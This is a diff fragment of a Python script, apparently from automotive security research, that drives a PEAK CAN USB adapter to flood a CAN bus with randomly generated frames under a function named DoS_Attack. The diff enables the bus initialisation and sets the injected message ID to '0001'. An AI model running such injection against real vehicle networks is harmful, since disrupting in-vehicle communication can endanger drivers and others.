@@ -25,23 +25,23 @@ def DoS_Attack(id, leng, data):
     # time.sleep(time_offset)
 
 if __name__ == "__main__":
-    # CAN = PCANBasic()                            #CANi
-    # CAN_BUS = PCAN_USBBUS6
-    # counter = 0    
-    # start_time = time.time()
-    # ind = 0
-    # result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
+    CAN = PCANBasic()                            #CANi
+    CAN_BUS = PCAN_USBBUS6
+    counter = 0    
+    start_time = time.time()
+    ind = 0
+    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
+    if result != PCAN_ERROR_OK:
+        # An error occurred, get a text describing the error and show it
+        #
+        print("oh No")
+        CAN.GetErrorText(result)
+        print(result)
     id_exist = False
-    # if result != PCAN_ERROR_OK:
-    #     # An error occurred, get a text describing the error and show it
-    #     #
-    #     print("oh No")
-    #     CAN.GetErrorText(result)
-    #     print(result)
 
     while True:
         time_offset = random.randrange(1, 50) / 1000
-        injection_id = "0000"
+        injection_id = "0001"
         attack_data = []
         leng = random.randrange(1, 8)
         for _ in range(leng):
